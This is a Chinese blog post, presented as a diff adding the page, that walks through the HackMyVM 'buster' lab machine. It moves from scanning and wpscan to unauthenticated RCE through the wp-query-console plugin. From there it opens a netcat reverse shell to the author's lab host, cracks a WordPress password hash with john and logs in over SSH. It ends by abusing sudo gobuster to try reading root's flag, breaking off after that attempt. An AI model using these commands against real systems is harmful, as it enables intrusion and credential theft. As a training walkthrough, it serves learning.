@@ -1,0 +1,254 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm-buster | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm-buster">
+<meta property="og:url" content="http://yliken.github.io/2025/02/24/hackmyvm-buster/index.html">
+<meta property="og:site_name" content="Yliken">
+<meta property="og:description" content="题目地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[&#x2F;home&#x2F;kali]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC&#x2F;Vendor f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yliken.github.io/img/essayhead/22.webp">
+<meta property="article:published_time" content="2025-02-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-02-24T13:36:32.643Z">
+<meta property="article:author" content="Yliken">
+<meta property="article:tag" content="hackmyvm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yliken.github.io/img/essayhead/22.webp"><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://yliken.github.io/2025/02/24/hackmyvm-buster/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm-buster',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-24 21:36:32'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/essayhead/second.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/essayhead/22.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="Yliken"><img class="site-icon" src="/img/essayhead/second.jpg"/><span class="site-name">Yliken</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm-buster</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-23T16:00:00.000Z" title="发表于 2025-02-24 00:00:00">2025-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-24T13:36:32.643Z" title="更新于 2025-02-24 21:36:32">2025-02-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Linux%E9%9D%B6%E6%9C%BA/">Linux靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hackmyvm-buster"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=buster">题目地址</a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>主机发现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:b0:9b:6b       (Unknown)</span><br><span class="line">192.168.56.105  08:00:27:da:56:11       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.157 seconds (118.68 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<p><strong>端口扫描</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sC -sV 192.168.56.105</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 07:33 EST</span><br><span class="line">Nmap scan report for 192.168.56.105</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)</span><br><span class="line">|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)</span><br><span class="line">|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-title: bammmmuwe</span><br><span class="line">|_http-generator: WordPress 6.7.1</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/wp-admin/</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">MAC Address: 08:00:27:DA:56:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds</span><br></pre></td></tr></table></figure>
+
+<p>80端口开了一个http服务。是一个用wordpress搭建的站点。</p>
+<p>用<code>wpscan</code>进行一些信息收集</p>
+<p>最开始我只进行了<code>wpscan --url http://192.168.56.105 -e u,ap</code>没用使用<code>--plugins-detection aggressive</code> 模式。</p>
+<p>对目标进行了好几次的信息收集，但是没有收集到任何漏洞信息</p>
+<p>后来使<code>wpscan --url http://192.168.56.105 -e u,ap --plugins-detection aggressive</code> 发现网站存在一个<a target="_blank" rel="noopener" href="https://github.com/wy876/POC/blob/main/WordPress/WordPress%E6%8F%92%E4%BB%B6query-console%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md">CVE-2024-50498</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿LAPTOP-40PQI58C)-[/mnt/c/Users/legion]</span><br><span class="line">└─# wpscan --url http://192.168.56.105 -e u,ap --plugins-detection aggressive</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.56.105/ [192.168.56.105]</span><br><span class="line">[+] Started: Mon Feb 24 20:36:52 2025</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: nginx/1.14.2</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://192.168.56.105/robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - /wp-admin/</span><br><span class="line"> |  - /wp-admin/admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.56.105/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.56.105/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.56.105/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).</span><br><span class="line"> | Found By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.56.105/, Match: &#x27;WordPress 6.7.1&#x27;</span><br><span class="line"> | Confirmed By: Rss Generator (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;</span><br><span class="line"> |  - http://192.168.56.105/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:14:12 &lt;==================================&gt; (109235 / 109235) 100.00% Time: 00:14:12</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://192.168.56.105/wp-content/plugins/akismet/</span><br><span class="line"> | Last Updated: 2025-02-14T18:49:00.000Z</span><br><span class="line"> | Readme: http://192.168.56.105/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 5.3.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/akismet/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 5.3.5 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/akismet/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/akismet/readme.txt</span><br><span class="line"></span><br><span class="line">[+] feed</span><br><span class="line"> | Location: http://192.168.56.105/wp-content/plugins/feed/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/feed/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] wp-query-console</span><br><span class="line"> | Location: http://192.168.56.105/wp-content/plugins/wp-query-console/</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2018-03-16T16:03:00.000Z</span><br><span class="line"> | Readme: http://192.168.56.105/wp-content/plugins/wp-query-console/README.txt</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/wp-query-console/, status: 403</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-content/plugins/wp-query-console/README.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==========================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] ta0</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.105/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] welcome</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Feb 24 20:51:12 2025</span><br><span class="line">[+] Requests Done: 109276</span><br><span class="line">[+] Cached Requests: 42</span><br><span class="line">[+] Data Sent: 29.237 MB</span><br><span class="line">[+] Data Received: 33.165 MB</span><br><span class="line">[+] Memory used: 478.477 MB</span><br><span class="line">[+] Elapsed time: 00:14:20</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿着payload直接打了,页面报错了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242054874.png" alt="image-20250224205414747"></p>
+<p>执行了<code>phpinfo()</code>页面正常</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242055849.png" alt="image-20250224205521763"></p>
+<p>但是执行其他语句就都是400</p>
+<p>我执行了<code>var_dump(1)</code>，虽然页面还是400 但是页面返回来了结果</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242056354.png" alt="image-20250224205623271"></p>
+<p>在刚刚的返回的<code>phpinfo()</code>页面看到了禁用的函数</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242057699.png" alt="image-20250224205719657"></p>
+<p>但是用反引号还是能执行命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242059581.png" alt="image-20250224205942468"></p>
+<p>弹个shell<code>nc -e /bin/sh 192.168.56.103 7777</code></p>
+<p>拿到了<code>www-data</code>的权限</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242101567.png" alt="image-20250224210152514"></p>
+<p>有一个叫<code>welcome</code>的普通用户。同时WordPress也有一个<code>welcome</code>的用户</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242102739.png" alt="image-20250224210254665"></p>
+<p>上传一个php文件连接数据库读取出WordPress数据库中的用户与密码</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502242104006.png" alt="image-20250224210403829"></p>
+<p>刚看到这里的时候，脑子一抽。想着将加密的密码更新为已知的密码。</p>
+<p>然后</p>
+<p>突然间想起来 这里的<code>welcome</code>的密码可能就是系统用户<code>welcome</code>的密码</p>
+<p>就拿了密码 用jhon去爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# john --show hash                     </span><br><span class="line">?:104567</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
+
+<p>然后通过ssh 顺利登录系统</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# ssh welcome@192.168.56.105</span><br><span class="line">Linux listen 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Feb 24 04:57:16 2025 from 192.168.56.103</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">welcome</span><br></pre></td></tr></table></figure>
+
+<p><code>sudo -l</code> 看到<code>/usr/bin/gobuster</code>不需要密码就可以使用sudo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -l</span></span><br><span class="line">Matching Defaults entries for welcome on listen:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on listen:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/gobuster</span><br></pre></td></tr></table></figure>
+
+<p>最开始是没有什么思路的</p>
+<p>突然间想到可以将 <code>/root/root.txt</code>文件指定为字典</p>
+<p>在kali上用<code>python -m http.server</code>起一个http服务</p>
+<p>然后执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster -u &quot;http://192.168.56.101:8080&quot; -w /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p>很不幸<code>root&#39;s flag</code>的名字不叫<code>root.txt</code></p>
